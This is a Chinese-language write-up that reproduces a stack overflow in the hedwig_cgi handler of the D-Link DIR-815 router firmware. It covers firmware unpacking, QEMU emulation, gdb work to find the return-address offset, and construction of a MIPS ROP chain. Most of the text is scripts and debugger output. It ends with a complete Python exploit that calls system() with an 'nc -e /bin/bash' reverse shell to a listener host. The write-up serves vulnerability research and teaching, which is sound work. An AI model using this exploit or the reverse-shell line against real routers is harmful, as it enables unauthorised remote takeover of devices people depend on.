# DLink 815系列路由器栈溢出漏洞分析与复现
> ChaMd5
> 来源：https://www.iotsec-zone.com/article/58

# 漏洞介绍：
DIR-815 cgibi中hedwig_cgi函数中处理HTTP 头中 Cookie 字段中 uid 的值时存在栈溢出漏洞
版本：DIR-815 FW 1.01b14_1.01b14
# 一、固件解包
利用binwalk进行固件解包：
```
binwalk -e DIR-815 FW 1.01b14_1.01b14.bin
```
得到文件系统如下：
![0.png](https://www.iotsec-zone.com/images/MdImg/cab6920a461f3c1483e14b3267c1d309.png) 
# 二、漏洞静态分析

漏洞存在于hedwig_cgi函数中，当其处理前端的HTTP头中Cookie字段的uid值时，存在栈溢出漏洞。hedwig_cgi是集成到cgibin文件中的，因此直接拖取cgibin文件进行分析，定位hedwig_cgi函数：
当程序获取Cookie字段中的uid值后，直接将内容复制到v27所在数组中，造成栈溢出。

![1.png](https://www.iotsec-zone.com/images/MdImg/0e1cefdb36c2e3c7d20790ccab17ce16.png) 
对应汇编代码如下:
![2.png](https://www.iotsec-zone.com/images/MdImg/0e0602c0e7cf5e7cafc39918ea335675.png) 
函数返回处汇编代码如下：
![3.png](https://www.iotsec-zone.com/images/MdImg/56d0582b41a3acd5c36b245bf829f301.png) 
# 三、漏洞动态调试
为了能对程序进行调试，确认溢出偏移量，需要进行仿真，下面分用户仿真和系统仿真两种方法。
### 1.用户仿真
用户仿真脚本如下：
```
#!/bin/bash
test=$(python -c "print 'uid=' + 'A'*1043 + 'BBBB'")
LEN=$(echo -n "$test" | wc -c)
PORT="1234"
sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$test -E REQUEST_URL="/hedwig.cgi" -g $PORT /htdocs/web/hedwig.cgi 2>/dev/null
```
在ubuntu18虚拟机下，用户仿真用gdb调试失败，但是可以利用ida进行远程调试
但是在用户仿真情况下，不能正常执行shellcode相关功能，因此还是利用系统仿真。
### 2.系统仿真
#### （1）系统仿真启动
首先进行qemu虚拟机启动：
```
sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap -nographic
```
在主机中进行网络配置：
```
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT
sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0
```
在虚拟机中进行网络配置：
```
ifconfig eth1 192.168.100.2 netmask 255.255.255.0
route add default gw 192.168.100.254
```
主机虚拟机互相ping通：

![4.png](https://www.iotsec-zone.com/images/MdImg/b7e0ff29b824a596b16f210e0bd42da1.png) 

为了方便调试，关闭地址随机化：
```
echo 0 > /proc/sys/kernel/randomize_va_space
```
上传路由器文件系统：

```
scp -r squashfs-root/ root@192.168.100.2:~/
```
系统仿真时，需要模拟启动hedwig.cgi相关服务，模拟其相关服务时需要配置好conf文件：（放在squash根目录下）
```
Umask 026
PIDFile /var/run/httpd.pid
LogGMT On  #开启log
ErrorLog /log #log文件
Tuning
{
    NumConnections 15
    BufSize 12288
    InputBufSize 4096
    ScriptBufSize 4096
    NumHeaders 100
    Timeout 60
    ScriptTimeout 60
}
Control
{
    Types
    {
        text/html    { html htm }
        text/xml    { xml }
        text/plain    { txt }
        image/gif    { gif }
        image/jpeg    { jpg }
        text/css    { css }
        application/octet-stream { * }
    }
    Specials
    {
        Dump        { /dump }
        CGI            { cgi }
        Imagemap    { map }
        Redirect    { url }
    }
    External
    {
        /usr/sbin/phpcgi { php }
    }
}
Server
{
    ServerName "Linux, HTTP/1.1, "
    ServerId "1234"
    Family inet
    Interface eth0         #网卡
    Address 192.168.100.2  #qemu的ip地址
    Port "4321"            #对应web访问端口
    Virtual
    {
        AnyHost
        Control
        {
            Alias /
            Location /htdocs/web
            IndexNames { index.php }
            External
            {
                /usr/sbin/phpcgi { router_info.xml }
                /usr/sbin/phpcgi { post_login.xml }
            }
        }
        Control
        {
            Alias /HNAP1
            Location /htdocs/HNAP1
            External
            {
                /usr/sbin/hnap { hnap }
            }
            IndexNames { index.hnap }
        }
    }
}
```

然后利用如下脚本在qemu中启动httpd服务：（在根目录下运行）

```
#!/bin/bash
cp conf /
cp sbin/httpd /
cp -rf htdocs/ /
rm /etc/services
cp -rf etc/ /
cp lib/ld-uClibc-0.9.30.1.so  /lib/
cp lib/libcrypt-0.9.30.1.so  /lib/
cp lib/libc.so.0  /lib/
cp lib/libgcc_s.so.1  /lib/
cp lib/ld-uClibc.so.0  /lib/
cp lib/libcrypt.so.0  /lib/
cp lib/libgcc_s.so  /lib/
cp lib/libuClibc-0.9.30.1.so  /lib/
cd /
ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi
ln -s /htdocs/cgibin /usr/sbin/phpcgi
ln -s  /htdocs/cgibin /usr/sbin/hnap
./httpd -f conf
```

然后在ubuntu中访问hedwig.cgi服务：

![5.png](https://www.iotsec-zone.com/images/MdImg/4768fc38080e34e458698dea7af0bb8f.png) 

在qemu中直接运行hedwig.cgi服务，显示no REQUEST，说明hedwig.cgi服务没有收到请求

![6.png](https://www.iotsec-zone.com/images/MdImg/77aaab3de6dd844f50598bcc00c68b26.png) 

因此需要提前配置REQUEST_METHOD等方法，这里通过环境变量进行设置：

```
export CONTENT_LENGTH="100"
export CONTENT_TYPE="application/x-www-form-urlencoded"
export REQUEST_METHOD="POST"
export REQUEST_URI="/hedwig.cgi"
export HTTP_COOKIE="uid=1234"
```
此时再运行hedwig.cgi服务即可正常接收内容：
![7.png](https://www.iotsec-zone.com/images/MdImg/a902632db37fa7068ec12612a2bcf646.png) 
 （2）调试确定栈溢出偏移
下面利用gdbserver对hedwig.cgi服务进行调试，调试脚本如下：

```
#!/bin/bash
export CONTENT_TYPE="application/x-www-form-urlencoded"
export HTTP_COOKIE=$(python -c "print 'uid=' + 'A'*1009 + 'BBBB'")
#export HTTP_COOKIE="uid=`cat context`"
export CONTENT_LENGTH=$(echo -n "$HTTP_COOKIE" | wc -c)
export REQUEST_METHOD="POST"
export REQUEST_URI="/hedwig.cgi"
echo "uid=4321"|./gdbserver.mipsle 192.168.100.254:8888 /htdocs/web/hedwig.cgi
#echo "uid=4321"|/htdocs/web/hedwig.cgi
```
qemu中运行调试脚本，ubuntu中进行gdb连接：
![8.png](https://www.iotsec-zone.com/images/MdImg/74d0a84002e04a22979c34fe0578a1f9.png) 
在hedwig_cgi函数的返回地址下断，然后查看此时栈空间：

```
SP   0x7fff63c8 ◂— 0x0
*PC   0x409a38 ◂— lw     $s6, 0x4d8($sp)
─────────[ DISASM ]─────────
   0x409a28    lw     $ra, 0x4e4($sp)
   0x409a2c    move   $v0, $s7
   0x409a30    lw     $fp, 0x4e0($sp)
   0x409a34    lw     $s7, 0x4dc($sp)
 ► 0x409a38    lw     $s6, 0x4d8($sp)
   0x409a3c    lw     $s5, 0x4d4($sp)
   0x409a40    lw     $s4, 0x4d0($sp)
   0x409a44    lw     $s3, 0x4cc($sp)
   0x409a48    lw     $s2, 0x4c8($sp)
   0x409a4c    lw     $s1, 0x4c4($sp)
   0x409a50    lw     $s0, 0x4c0($sp)
```
查看此时sp+0x4e4地址，成功劫持。因此可以判定偏移量为1009.
```
pwndbg> x/20xw 0x7fff68ac
0x7fff68ac: 0x42424242 0x77fe2100 0x77fe26bc 0x77fe236c
0x7fff68bc: 0x7fff68c0 0x77faa4e0 0x00000000 0x00000000
0x7fff68cc: 0x00000000 0x00000000 0x00000000 0x00000000
0x7fff68dc: 0x00000000 0x00000003 0x00400034 0x00000004
0x7fff68ec: 0x00000020 0x00000005 0x00000008 0x00000006
```
### （3）ROP链构造
核心目的就是劫持返回地址，执行system( )函数。为了避免cache incoherency机制，我们利用system函数来构造ROP链进行shell的反弹，而不直接布置shellcode。首先要确定可以调用system函数的libc，利用vmmap查看各区段：
```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
  0x400000   0x41c000 r-xp    1c000 0      /htdocs/cgibin
  0x42c000   0x42d000 rw-p     1000 1c000  /htdocs/cgibin
  0x42d000   0x430000 rwxp     3000 0      [heap]
0x77f34000 0x77f92000 r-xp    5e000 0      /lib/libc.so.0
0x77f92000 0x77fa1000 ---p     f000 0      
0x77fa1000 0x77fa2000 r--p     1000 5d000  /lib/libc.so.0
0x77fa2000 0x77fa3000 rw-p     1000 5e000  /lib/libc.so.0
0x77fa3000 0x77fa8000 rw-p     5000 0      
0x77fa8000 0x77fd1000 r-xp    29000 0      /lib/libgcc_s.so.1
0x77fd1000 0x77fe1000 ---p    10000 0      
0x77fe1000 0x77fe2000 rw-p     1000 29000  /lib/libgcc_s.so.1
0x77fe2000 0x77fe7000 r-xp     5000 0      /lib/ld-uClibc.so.0
0x77ff5000 0x77ff6000 rw-p     1000 0      
0x77ff6000 0x77ff7000 r--p     1000 4000   /lib/ld-uClibc.so.0
0x77ff7000 0x77ff8000 rw-p     1000 5000   /lib/ld-uClibc.so.0
0x7ff58000 0x7fff7000 rwxp    9f000 0      [stack]
0x7fff7000 0x7fff8000 r-xp     1000 0      [vdso]
```
查看libc.so.0链接的libc文件：
```
ls -l libc.so.0
lrwxrwxrwx 1 root root 21 12月 26 22:03 libc.so.0 -> libuClibc-0.9.30.1.so
```
因此所需要的system函数及相关gadgets均在libuClibc-0.9.30.1.so。
根据mipsrop工具查找到的gadgets，构造ROP链：
这里参考《揭秘家用路由器0day漏洞挖掘技术》一书的方法：先将 system 函数的地址 -1 传入某个寄存器中，之后找到对这个寄存器进行加 +1 的操作的 gadget 进行调用即可将system地址恢复，因此我们查找“addiu $s0,1”指令，选用gadgets：158c8
![9.png](https://www.iotsec-zone.com/images/MdImg/af135a932767d88bb1a1838a59787d11.png) 
![10.png](https://www.iotsec-zone.com/images/MdImg/1da9d16f10c5fa32ecd61dc3451b0791.png)  
可知第一个gadgets可以将s0赋值为system函数地址。
现在我们还需要找到给system函数传参的gadgets。利用mipsrop.stackfinder，选用gadgets：159cc。因为其既可以跳转至system函数，又可以通过s5给system函数传参。
![11.png](https://www.iotsec-zone.com/images/MdImg/ca5f2795eeb4d51d8640dbe1623f340d.png) 
![12.png](https://www.iotsec-zone.com/images/MdImg/336d948a1ff53c95eba6d6b626a952b6.png) 
因此整体流程为：
```
劫持地址-->gadget1:0x158c8(给s0赋值为system函数地址,跳转至s5)--->gadgets2:0x159cc(给system函数传参并跳转执行)
```
因此exp编写如下：
```
#!/usr/bin/python2
from pwn import *
context.endian = "little"
context.arch = "mips"
base_addr = 0x77f34000
system_addr_1 = 0x53200-1
gadget1 = 0x158c8
gadget2 = 0x159cc
cmd = 'nc -e /bin/bash 192.168.100.254 9999'
padding = 'A' * 973
padding += p32(base_addr + system_addr_1) # s0
padding += 'A' * 4                        # s1
padding += 'A' * 4                        # s2
padding += 'A' * 4                        # s3
padding += 'A' * 4                        # s4
padding += p32(base_addr+gadget2)         # s5
padding += 'A' * 4                        # s6
padding += 'A' * 4                        # s7
padding += 'A' * 4                        # fp
padding += p32(base_addr + gadget1)       # ra
padding += 'B' * 0x10
padding += cmd
f = open("context",'wb')
f.write(padding)
f.close()
```
运行exp生成context，将congtext上传，然后运行hedwig.cgi服务：
```
!/bin/bash
export CONTENT_TYPE="application/x-www-form-urlencoded"
#export HTTP_COOKIE=$(python -c "print 'uid=' + 'A'*1009 + 'BBBB'")
export HTTP_COOKIE="uid=`cat context`"
export CONTENT_LENGTH=$(echo -n "$HTTP_COOKIE" | wc -c)
export REQUEST_METHOD="POST"
export REQUEST_URI="/hedwig.cgi"
#echo "uid=4321"|./gdbserver.mipsle 192.168.100.254:8888 /htdocs/web/hedwig.cgi
echo "uid=4321"|/htdocs/web/hedwig.cgi
```
主机端nc监听并反弹shell如下：
![13.png](https://www.iotsec-zone.com/images/MdImg/ac4fa621a5fe5b1fc7dcc5ca653402fe.png)
以上就是整体的调试流程，当然也可以通过布置shellcode来实现shell的反弹，但是需要绕过cache incoherency机制，利用sleep函数进行flush操作。 
